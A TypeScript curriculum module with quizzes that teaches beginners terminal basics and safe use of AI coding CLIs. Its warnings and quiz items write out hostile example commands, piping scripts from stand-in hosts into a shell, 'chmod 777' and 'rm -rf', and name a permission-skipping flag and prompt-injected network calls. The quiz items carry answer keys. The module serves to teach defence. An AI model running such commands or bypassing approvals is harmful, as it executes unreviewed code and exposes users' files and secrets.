import type { CurriculumModule } from '../schema.ts';

export const MODULE_5: CurriculumModule = {
  id: 'mod-5-claude-cli',
  number: 5,
  title: 'Using Claude Code & AI CLIs',
  subtitle: 'Conquer terminal anxiety and learn how to partner safely with AI coding CLIs inside a project folder.',
  icon: 'terminal',
  accentHex: '#EC4899',
  estimatedMinutes: 18,
  recommendedLabId: 'claude-cli',
  chapters: [
    {
      id: 'ch-5-1',
      moduleId: 'mod-5-claude-cli',
      number: 1,
      title: 'No-Fear Intro to the Terminal (CLI)',
      readMinutes: 4,
      xpReward: 30,
      summary:
        'Movies make the terminal window look like hacker magic, yet it is just a text-based way to navigate folders. Learn the four everyday commands—and the real truth about terminal safety.',
      analogy: {
        title: 'Pointing at Menu Pictures vs. Ordering by Name',
        body: 'Clicking icons in Finder or File Explorer is like pointing at glossy photos on a restaurant menu. Typing inside a terminal (CLI) is simply saying "One masala chai, please" out loud. Same computer, same folders—just faster, clearer, and able to work directly with AI coding tools.'
      },
      sections: [
        {
          heading: 'What the terminal really is (and how to respect it safely)',
          body: 'If opening a dark window with a blinking cursor makes your stomach drop, you are in great company. The **Terminal** (Command Line or Shell) is simply a text conversation with your computer’s folders and programs.\n\nRead-only navigation commands like `pwd` and `ls` are completely safe to explore. At the same time, respect one crucial reality: **unlike clicking Delete in a desktop window, destructive terminal commands often run immediately with NO confirmation prompt and NO Recycle Bin/Trash**! Commands like `rm`, overwriting with `mv` or `>`, or piping internet scripts (`curl ... | sh`) act right away—so read every command before pressing Enter.',
          callout: {
            type: 'myth',
            title: 'Myth Buster: "You must memorize 100 cryptic commands to use a terminal"',
            body: 'Not even close! Most everyday work uses just **four** safe navigation commands 95% of the time—and you can always ask AI to explain any unfamiliar command word for word before you run it.'
          }
        },
        {
          heading: 'The Fabulous Four commands (learn them in 60 seconds)',
          body: 'Picture your computer’s folders as rooms inside a house. These four tiny commands let you walk around effortlessly:\n\n• **`pwd`** (*Print Working Directory*): "Which room am I standing in right now?"\n• **`ls`** (*List*): "What files and subfolders are inside this room?"\n• **`cd folder-name`** (*Change Directory*): "Walk into that subfolder." (Type `cd ..` to step back out one level.)\n• **`mkdir my-project`** (*Make Directory*): "Create a brand-new empty folder named `my-project`."',
          callout: {
            type: 'example',
            title: 'A complete 10-second walk into a project folder',
            body: '1. Type `pwd` -> `/home/you`\n2. Type `mkdir my-site` -> creates a clean new folder\n3. Type `cd my-site` -> steps inside\n4. Type `ls` -> sees everything inside `my-site`\nThat is genuinely all it takes to get oriented!'
          }
        },
        {
          heading: 'Three comfort shortcuts that make the terminal feel cozy',
          body: 'Once you know the Fabulous Four, three keyboard habits turn the terminal from awkward into effortless:\n\n1. **Up Arrow (`↑`)**: Cycles back through commands you already typed so you never retype long paths.\n2. **Tab key (`Tab`)**: Auto-completes long folder and file names after 2–3 letters (fewer typos!).\n3. **`Ctrl + C`**: The universal polite panic brake! If a command is running too long or you want to cancel a line you started typing, press `Ctrl + C` to interrupt it and get a clean prompt back.',
          callout: {
            type: 'tip',
            title: 'Quick phone drill: trace the four commands in your head',
            body: 'Imagine opening a terminal in `/home/alex`. You want to create a `cafe-site` folder, step inside, and confirm your location. The exact sequence is `mkdir cafe-site` -> `cd cafe-site` -> `pwd`.'
          }
        }
      ],
      keyTakeaways: [
        'Four simple commands cover everyday navigation: `pwd` (where am I?), `ls` (what is here?), `cd` (move folder), and `mkdir` (create folder).',
        'Unlike Trash/Recycle Bin clicks, destructive shell commands (`rm`, `mv` overwrite, `>`, `curl | sh`) often execute immediately without confirmation—always read before running.',
        'Use `Tab` to autocomplete names, `Up Arrow` to recall commands, and `Ctrl + C` to interrupt a stuck command.'
      ],
      glossaryTermIds: ['terminal', 'cli', 'working-directory'],
      relatedLabId: null,
      quiz: [
        {
          id: 'q-5-1-1',
          type: 'multiple_choice',
          question: 'You just opened a terminal and want to check which exact folder you are currently standing inside. Which command do you type?',
          options: [
            'mkdir',
            'pwd',
            'cd ..',
            'ls'
          ],
          correctIndex: 1,
          explanation:
            '`pwd` stands for Print Working Directory—it immediately prints the exact folder path your terminal is currently standing inside.'
        },
        {
          id: 'q-5-1-2',
          type: 'true_false',
          question:
            'Destructive terminal commands like `rm` or redirecting with `>` always pause with a confirmation dialog and move files safely to the Recycle Bin first.',
          options: ['True', 'False'],
          correctIndex: 1,
          explanation:
            'False! Many shell commands (`rm`, `mv` overwrites, `>` truncation, `git reset --hard`) act immediately with no prompt and no Recycle Bin—always read commands carefully before pressing Enter.'
        },
        {
          id: 'q-5-1-3',
          type: 'spot_mistake',
          question:
            'Maya wants to list the files inside her `portfolio` folder, so she opens the terminal in her home folder and types `ls` without running `cd portfolio`. Why does she not see `index.html`?',
          options: [
            'Her working directory is still home—she must run `cd portfolio` first.',
            'The `ls` command hides web files like HTML and CSS unless you run it with administrator privileges.',
            'Terminal sessions can only display folders created during the exact same session using `mkdir`.',
            'Every `ls` command requires passing the full absolute path from `/` before showing any subfolder.'
          ],
          correctIndex: 0,
          explanation:
            'Terminal commands act on your current working directory! Check `pwd` and `cd` into your project folder before inspecting files or launching an AI CLI.'
        }
      ]
    },
    {
      id: 'ch-5-2',
      moduleId: 'mod-5-claude-cli',
      number: 2,
      title: 'What Is Claude Code CLI & How to Scope It Safely',
      readMinutes: 4,
      xpReward: 30,
      summary:
        'Claude Code (and sibling AI CLIs like Gemini CLI and Codex CLI) puts an AI agent inside your project folder—removing copy-paste gymnastics while requiring disciplined folder scoping.',
      analogy: {
        title: 'Inviting the Carpenter Inside One Specific Room',
        body: 'Using a browser chatbot to build software is like texting photos of a wobbly table to a carpenter across town and sawing the wood yourself. Using an AI CLI invites the carpenter right into your workshop to measure, propose cuts for approval, and check the result—which is why you invite them into ONE project room, never your whole house!'
      },
      sections: [
        {
          heading: 'Why AI CLIs changed everything for beginners',
          body: 'With plain browser chatbots, beginners hit the same frustrating wall: copy code from chat -> paste into the wrong file -> miss one bracket -> paste the whole file back -> repeat 30 times.\n\n**Claude Code CLI** (and similar terminal agents like Gemini CLI and OpenAI Codex CLI) runs directly inside your project folder so it can:\n\n• Read your real files instead of guessing from pasted fragments\n• Propose clean surgical edits with a red/green diff preview\n• Run tests or check errors right in the terminal\n• Pause calmly for your explicit **Yes / No** approval before modifying files or running commands',
          callout: {
            type: 'example',
            title: 'The entire workflow starts with one focused command',
            body: 'Walk into a dedicated project folder (`cd ~/Projects/my-website`), confirm with `pwd`, and launch the CLI (for example `claude`). The interactive prompt opens scoped right to that folder.'
          }
        },
        {
          heading: 'Installation, authentication, and folder trust',
          body: 'Setting up an AI CLI takes a couple of minutes when you are at a computer:\n\n1. **Install only from official docs**: Use the provider’s official installer or documented package command—never copy-paste random install scripts from forum comments.\n2. **Authenticate cleanly**: Sign in via the official browser login (eligible subscription) or connect a scoped, capped API key.\n3. **Treat the "Trust this folder?" prompt seriously**: Untrusted downloads or random repositories can contain hidden hooks, build scripts, or tool configs—only trust folders whose files you actually know!',
          callout: {
            type: 'warning',
            title: 'Always `cd` into a dedicated project folder first!',
            body: 'Never launch an AI coding CLI inside your top-level home folder (`/home/you`), Documents, or root (`/`). Keep each project in its own subfolder so personal tax PDFs, SSH keys, and unrelated files stay completely out of scope.'
          }
        },
        {
          heading: 'One mental model works across every AI CLI',
          body: 'Even though this unit highlights **Claude Code CLI** for its clear diff approvals, the exact same habits transfer directly to **Gemini CLI**, **Codex CLI**, **OpenCode**, and AI editors like **Cursor** or **Antigravity**: isolate the folder -> explain first -> review diffs -> verify -> save a clean Git checkpoint.',
          callout: {
            type: 'tip',
            title: 'No desktop needed to master the workflow',
            body: 'Every command, diff check, and Git safety habit you learn here is a mental checklist—once you recognize red/green diffs and safe scoping, using any real AI CLI feels natural on day one.'
          }
        }
      ],
      keyTakeaways: [
        'AI CLIs run inside your project folder to read files, propose red/green diff edits, and verify changes without tedious copy-paste cycles.',
        'Always `cd` into a dedicated project subfolder—and only trust folders you know, since untrusted repos can hide malicious hooks or configs.',
        'The same safe workflow (scope -> explain -> review diff -> verify -> commit) works across Claude Code, Gemini CLI, Codex CLI, and AI editors.'
      ],
      glossaryTermIds: ['claude-code', 'cli', 'ai-harness', 'working-directory'],
      relatedLabId: null,
      quiz: [
        {
          id: 'q-5-2-1',
          type: 'multiple_choice',
          question: 'What is the main workflow advantage of an AI coding CLI inside a project folder over a plain browser chatbot?',
          options: [
            'It guarantees every API call is permanently free without any token metering or subscription.',
            'It bypasses all approval prompts so edits are saved silently without showing you a diff.',
            'It automatically deploys your private files and `.env` secrets to a live web server.',
            'It reads project files, proposes diffs, and verifies changes directly without copy-pasting.'
          ],
          correctIndex: 3,
          explanation:
            'Running inside a scoped project folder lets the AI harness inspect real files, present surgical diffs for your approval, and verify changes cleanly—eliminating fragile copy-paste loops.'
        },
        {
          id: 'q-5-2-2',
          type: 'true_false',
          question:
            'It is safe to click "Trust this folder" on any random zip file downloaded from the internet before inspecting what scripts or configs are inside.',
          options: ['True', 'False'],
          correctIndex: 1,
          explanation:
            'False! Untrusted repositories or downloaded folders can contain malicious hooks, MCP configs, or build scripts that run commands when trusted—only trust folders you know.'
        },
        {
          id: 'q-5-2-3',
          type: 'spot_mistake',
          question:
            'Devon opens his terminal in his top-level `/home/devon` directory (holding personal tax PDFs, photos, and SSH keys) and runs an AI CLI saying "Clean up unused files." Why is that risky?',
          options: [
            'AI CLIs cannot read filenames containing spaces unless they live inside a Desktop subfolder.',
            'Launching from the home directory exposes unrelated personal files and secrets—always isolate each project in its own subfolder.',
            'Home directories automatically switch the AI model into read-only mode so no cleanup can run.',
            'Running a CLI outside a Git repository doubles the per-token API price charged by the provider.'
          ],
          correctIndex: 1,
          explanation:
            'Scope is a real safety boundary! Always isolate each website or app inside its own dedicated subfolder and `cd` into it before launching an AI coding CLI.'
        }
      ]
    },
    {
      id: 'ch-5-3',
      moduleId: 'mod-5-claude-cli',
      number: 3,
      title: 'Your First AI CLI Session: Explain, Edit, Review Diff & Undo',
      readMinutes: 5,
      xpReward: 35,
      summary:
        'Follow the calm four-beat rhythm every confident AI builder uses: ask the AI to explain first, request one small edit, read the red-and-green diff before approving, and checkpoint safely with Git.',
      analogy: {
        title: 'Track Changes in Google Docs',
        body: 'When an editor suggests changes in Google Docs, old words show struck through in red and new words appear in green, with an Accept / Reject button beside them. An AI CLI **diff** works the exact same way—you never have to guess what changed or blindly accept edits.'
      },
      sections: [
        {
          heading: 'Step 1: Start by asking the AI to EXPLAIN before editing',
          body: 'When you open a project folder in an AI CLI, your best opening prompt is NOT "rewrite everything." Start with curiosity:\n\n*"Explain what files are in this folder and what each one does, in plain English—do not edit anything yet."*\n\nIn seconds, the agent gives you a plain map of the project AND proves it is standing in the right directory.',
          callout: {
            type: 'tip',
            title: 'Ask questions freely before touching code',
            body: 'Asking "What does line 14 of styles.css do?" or "Why are you suggesting this change?" builds real intuition—and helps you spot weird suggestions before approving them.'
          }
        },
        {
          heading: 'Step 2 & 3: Request one focused edit and read the Diff',
          body: 'Next, ask for ONE concrete improvement at a time—for instance: *"Add a welcoming hero banner at the top of `index.html` with a green Get Started button."*\n\nBefore saving anything, the CLI displays a **Diff**:\n• Lines starting with **`-`** in **red** are being removed or replaced.\n• Lines starting with **`+`** in **green** are being added.\n• Unchanged gray lines sit around them for context.\n\nConfirm the filename is the one you expected, scan the changed text and colors, then press **Yes** to approve—or **No** to ask for a revision.',
          callout: {
            type: 'example',
            title: 'Reading a 4-line diff takes 3 seconds',
            body: '```diff\n  <header>\n-   <h1>My Site</h1>\n+   <h1>Welcome to Bean & Book Cafe</h1>\n+   <a class="btn-green" href="#menu">Explore Menu</a>\n  </header>\n```\nRed = old title removed. Green = warm new title and button added. Clean, predictable, safe!'
          }
        },
        {
          heading: 'Step 4: The safety net—clean Git checkpoints without leaking secrets',
          body: 'What if you approve an edit, check the result, and prefer how it looked five minutes ago?\n\n**Git** is a free snapshot system for your folder. Before trying a big experiment, save a clean checkpoint—**and ALWAYS inspect `git status` first instead of blindly running `git add .`**!\n\n• **`git status`** -> Lists modified and untracked files so you immediately spot if `.env` or a stray private file is missing from `.gitignore`!\n• **`git diff`** -> Shows every line changed since your last commit.\n• Stage specific clean files (`git add index.html styles.css`) and commit (`git commit -m "Working homepage"`).\n• To revert an unwanted edit safely, verify what will be discarded with `git diff` first, then restore that file (note: discarding uncommitted edits is permanent!).',
          callout: {
            type: 'warning',
            title: 'Never blindly run `git add .` without checking `git status`',
            body: 'If `.gitignore` is missing or has a typo, `git add .` quietly stages `.env` and secret files right into your commit! Always run `git status` first and verify no secret files appear.'
          }
        }
      ],
      keyTakeaways: [
        'Start sessions by asking the AI CLI to explain the folder in plain English before editing anything.',
        'Read the red (`-` removed) and green (`+` added) Diff and verify the target filename before pressing Approve.',
        'Always check `git status` and `.gitignore` before staging—never blindly run `git add .`—and commit working milestones before big redesigns.'
      ],
      glossaryTermIds: ['diff', 'claude-code', 'git', 'commit', 'human-in-the-loop'],
      relatedLabId: null,
      quiz: [
        {
          id: 'q-5-3-1',
          type: 'multiple_choice',
          question: 'When an AI CLI shows a Diff preview before modifying a file, what do green lines prefixed with `+` indicate?',
          options: [
            'Lines with syntax errors being removed.',
            'New lines that will be added if you approve.',
            'Files that Git has already added to `.gitignore` to keep them private.',
            'Read-only context lines copied from neighboring files that will stay unchanged.'
          ],
          correctIndex: 1,
          explanation:
            'In standard Diff views, red `-` lines are removals and green `+` lines are additions—just like Track Changes in a document.'
        },
        {
          id: 'q-5-3-2',
          type: 'true_false',
          question:
            'Running `git add .` without checking `git status` first is always safe because Git automatically blocks any file containing an API key.',
          options: ['True', 'False'],
          correctIndex: 1,
          explanation:
            'False! Local Git does NOT automatically detect API keys—if `.env` is missing from `.gitignore`, `git add .` stages it immediately. Always run `git status` first!'
        },
        {
          id: 'q-5-3-3',
          type: 'spot_mistake',
          question:
            'Chris opens an AI CLI in a 12-file project and enables blanket auto-approve without reading diffs or saving a Git commit. Halfway through, the site breaks and he cannot tell what changed. What two habits would have protected him?',
          options: [
            'Saving a clean Git commit first and reviewing small diffs one step at a time.',
            'Turning off `.gitignore` and editing all files at once.',
            'Running `git reset --hard` after every prompt to clear edits.',
            'Switching to a higher temperature dial so the CLI explains changes in longer paragraphs.'
          ],
          correctIndex: 0,
          explanation:
            'Saving a clean Git checkpoint first and approving small, readable diffs one step at a time keeps every experiment calm and reversible!'
        }
      ]
    },
    {
      id: 'ch-5-4',
      moduleId: 'mod-5-claude-cli',
      number: 4,
      title: 'Power Workflows: Planning, Exact Errors, `/compact` & Command Safety',
      readMinutes: 5,
      xpReward: 35,
      summary:
        'Level up from curious beginner to calm, security-minded builder with four everyday habits: plan before editing, share exact errors, compact context cleanly, and reject unsafe shell permissions.',
      analogy: {
        title: 'Measure Twice, Cut Once—With Real Safety Guards',
        body: 'Great woodworkers do not grab a saw the instant they walk in. They sketch a quick plan (Plan Mode), inspect exact measurements (Exact Errors & Screenshots), sweep sawdust between tasks (`/compact`), and never disable the saw’s blade guard (Approval & Permission Safety).'
      },
      sections: [
        {
          heading: 'Workflow 1: Plan first, edit second',
          body: 'When you want something bigger than a tiny tweak—say, adding dark mode plus saving the user’s preference—do NOT ask the AI to jump straight into editing five files at once.\n\nAsk for a **plan first**: *"Do not edit any files yet. Propose a simple 3-step plan and list which files you will touch."* Many CLIs include a dedicated **Plan Mode** toggle. Reviewing a 5-line plan takes ten seconds and prevents 90% of messy detours.',
          callout: {
            type: 'tip',
            title: 'The magic phrase for calm building',
            body: 'Start bigger requests with: **"Before changing code, explain your plan in 4 short bullets and wait for my go-ahead."**'
          }
        },
        {
          heading: 'Workflow 2: Paste exact error messages & screenshots (redacting secrets!)',
          body: 'When something looks crooked or throws a red error, skip *"It broke, fix it."* Give the AI two sharp clues:\n\n1. **Copy-paste the exact error text** word for word (making sure no API keys, tokens, or passwords appear in the log!).\n2. **Share a screenshot** so a multimodal model can literally see the overlapping button or squished mobile layout.',
          callout: {
            type: 'example',
            title: 'Vague report vs. Pro bug report',
            body: 'Vague: "The button doesn’t work."\nPro: "When I click Calculate, nothing happens and the console shows: `TypeError: Cannot read properties of null (reading value) at script.js:29`. Explain why first, then apply the smallest fix."'
          }
        },
        {
          heading: 'Workflow 3 & 4: Sweep with `/compact` & NEVER disable safety approvals',
          body: 'After finishing one milestone, running **`/compact`** summarizes key decisions and clears noisy clutter from the context window, keeping the next task sharper and cheaper (and `/clear` resets completely for an unrelated task).\n\nMost importantly, **never turn off permission guardrails for convenience**: avoid wildcard auto-allow flags (like `--dangerously-skip-permissions` or blanket `Bash(*)`), and pause on ANY command that:\n• Pipes internet scripts into a shell (`curl ... | sh`)\n• Deletes or forcefully overwrites files/history (`rm -rf`, `git push --force`, `git reset --hard`)\n• Escalates privileges or loosens permissions (`sudo`, `chmod 777`)\n• Reads sensitive paths (`~/.ssh`, `.env`, credential stores) or sends local data to unfamiliar URLs—especially after reading untrusted web docs or repos that could carry **prompt injection**!',
          callout: {
            type: 'warning',
            title: 'Think allowlist, not just a tiny denylist',
            body: 'Dangerous commands go way beyond `rm -rf` and `sudo`! Never approve any shell command you do not understand, never turn on blanket wildcard shell access (`Bash(*)`), and inspect network, install, or permission-changing commands carefully.'
          }
        }
      ],
      keyTakeaways: [
        'Ask for a short plain-English plan BEFORE editing multiple files ("Measure twice, cut once").',
        'Share exact (secret-redacted) error text and screenshots instead of vague descriptions like "it broke."',
        'Use `/compact` between milestones, never enable wildcard auto-approve flags (`--dangerously-skip-permissions`, `Bash(*)`), and scrutinize every command touching files, permissions, Git history, secrets, or the network.'
      ],
      glossaryTermIds: ['compact-command', 'claude-code', 'git', 'console-error', 'multimodal'],
      relatedLabId: 'claude-cli',
      quiz: [
        {
          id: 'q-5-4-1',
          type: 'multiple_choice',
          question: 'When is the best time to run `/compact` during a long AI CLI session?',
          options: [
            'Right after finishing a milestone so old clutter is summarized cleanly.',
            'Before opening a folder, so `/compact` automatically creates your `.gitignore` and `.env` files.',
            'Only when you want to permanently delete modified source files and roll back to an empty repo.',
            'Every time you approve a single line change, because AI CLIs cannot handle two diffs in one chat.'
          ],
          correctIndex: 0,
          explanation:
            '`/compact` leaves your actual files untouched—it summarizes long conversation clutter into crisp notes between milestones so the context window stays sharp and affordable.'
        },
        {
          id: 'q-5-4-2',
          type: 'true_false',
          question:
            'Turning on a wildcard flag like `--dangerously-skip-permissions` or blanket `Bash(*)` is a recommended beginner shortcut because `rm -rf` is the only risky shell command.',
          options: ['True', 'False'],
          correctIndex: 1,
          explanation:
            'False! Many commands are risky—`curl | sh`, `chmod 777`, `git push --force`, `git reset --hard`, reading `~/.ssh`/`.env`, or prompt-injected network calls. Never grant blanket auto-approve!'
        },
        {
          id: 'q-5-4-3',
          type: 'spot_mistake',
          question:
            'While fixing a layout bug after pasting an external tutorial snippet, an AI CLI asks to run `curl https://unknown-site.example/fix.sh | sh` and `chmod 777 .`. Why should you immediately say No?',
          options: [
            'Because `curl` commands cannot download files smaller than one megabyte inside a local folder.',
            'Piping an unverified script into a shell executes arbitrary code, and `chmod 777` exposes files to all local users.',
            'Because CSS styling bugs can only be repaired using `git push --force` rather than shell commands.',
            'Only because `sh` is deprecated and the command should be re-run with `sudo` instead.'
          ],
          correctIndex: 1,
          explanation:
            'Piping unknown internet scripts directly into a shell (`curl | sh`) runs unreviewed arbitrary code on your machine, and `chmod 777` makes files world-writable—and untrusted snippets can even contain prompt injection!'
        }
      ]
    }
  ],
  masteryCheck: {
    id: 'mc-5-claude-cli',
    title: 'Unit 5 Mastery Check',
    subtitle: 'Check your command-line instincts: folder scoping, diffs, Git hygiene, and shell safety.',
    passThreshold: 0.75,
    xpReward: 40,
    estimatedMinutes: 2,
    questions: [
      {
        id: 'mc-5-q1',
        type: 'multiple_choice',
        question: 'You just downloaded an unfamiliar repository zip from a stranger online. What is the safest sequence before launching an AI coding CLI?',
        options: [
          'Launch the CLI in your top-level home folder and click "Trust" so it can inspect everything.',
          'Enable `--dangerously-skip-permissions` first so the CLI can clean the folder quickly.',
          'Inspect scripts/configs first, isolate it in its own subfolder, and never blindly trust.',
          'Run `git add .` immediately before opening any files so Git encrypts the zip.'
        ],
        correctIndex: 2,
        explanation:
          'Untrusted repos can hide malicious hooks, MCP configs, or build scripts. Isolate projects in a dedicated subfolder and inspect before trusting or running commands.'
      },
      {
        id: 'mc-5-q2',
        type: 'spot_mistake',
        question: 'After finishing a homepage header, Sam runs `git add . && git commit -m "done"` without checking `git status` or `.gitignore`. Why is that habit dangerous?',
        options: [
          'If `.gitignore` is missing or mistyped, `git add .` quietly stages `.env` secrets.',
          '`git add .` deletes every CSS file in the folder unless you run `/compact` beforehand.',
          'Git refuses to commit more than two files at a time unless you pass `--force`.',
          'Checking `git status` is only needed when deploying to a paid custom `.com` domain.'
        ],
        correctIndex: 0,
        explanation:
          'Always run `git status` and verify `.gitignore` covers `.env` before staging—never blindly stage everything with `git add .`.'
      },
      {
        id: 'mc-5-q3',
        type: 'multiple_choice',
        question: 'An AI CLI asks to run `git reset --hard HEAD~3` and `curl -s https://example.invalid/setup.sh | sh`. What makes BOTH commands risky?',
        options: [
          'They require a monthly consumer chat subscription rather than pay-as-you-go API credits.',
          'One permanently wipes local commits without Trash, and the other executes unreviewed remote code.',
          'Both commands only change font styling inside your terminal window without touching files.',
          'Neither command runs unless you first type `pwd` and `ls` in the same terminal tab.'
        ],
        correctIndex: 1,
        explanation:
          '`git reset --hard` permanently discards uncommitted work and rewinds commits without confirmation, while `curl | sh` executes unreviewed remote code straight in your shell.'
      },
      {
        id: 'mc-5-q4',
        type: 'multiple_choice',
        question: 'You want your AI CLI to add dark mode across four files after a long morning session. What is the cleanest workflow?',
        options: [
          'Turn on blanket `Bash(*)` auto-approve and ask it to rewrite all four files immediately.',
          'Keep the bloated chat history and paste "make dark mode look nice" with no details.',
          'Delete `.gitignore` so the CLI can read your system configuration files for theme colors.',
          'Run `/compact`, ask for a short plan first, and review small diffs step by step.'
        ],
        correctIndex: 3,
        explanation:
          'Compacting stale clutter, reviewing a concise plan before edits, and approving focused diffs one step at a time keeps multi-file changes accurate and reversible.'
      }
    ]
  }
};
